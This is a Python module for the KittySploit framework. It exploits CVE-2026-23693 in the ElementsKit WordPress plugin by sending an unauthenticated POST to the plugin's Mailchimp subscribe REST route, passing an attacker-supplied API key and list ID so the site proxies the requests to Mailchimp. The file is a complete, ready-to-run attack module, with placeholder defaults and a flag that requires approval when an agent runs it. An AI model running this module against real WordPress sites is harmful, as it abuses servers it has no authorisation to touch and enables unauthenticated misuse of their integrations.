#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ElementsKit CVE-2026-23693 — unauthenticated Mailchimp API proxy."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "ElementsKit CVE-2026-23693 Mailchimp proxy",
        "description": (
            "POSTs attacker-supplied Mailchimp apikey/list to elementskit mailchimp subscribe REST route."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-23693"],
        "tags": ["wordpress", "elementskit", "proxy", "cve-2026-23693"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    email = OptString("poc@example.com", "Subscriber email field", required=False)
    list_id = OptString("invalid-list", "Mailchimp list id", required=False)
    api_key = OptString(
        "0000000000000000000000000000000-us1",
        "Mailchimp API key forwarded by plugin",
        required=False,
    )

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-json/elementskit/v1/widget/mailchimp/subscribe"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "email": (self.email or "poc@example.com").strip(),
                "list": (self.list_id or "invalid-list").strip(),
                "apikey": (self.api_key or "").strip(),
            },
            allow_redirects=False,
        )
        if resp:
            print_success("Mailchimp proxy invoked")
            print_status((resp.text or "")[:800])
            return True
        print_error("Request failed")
        return False
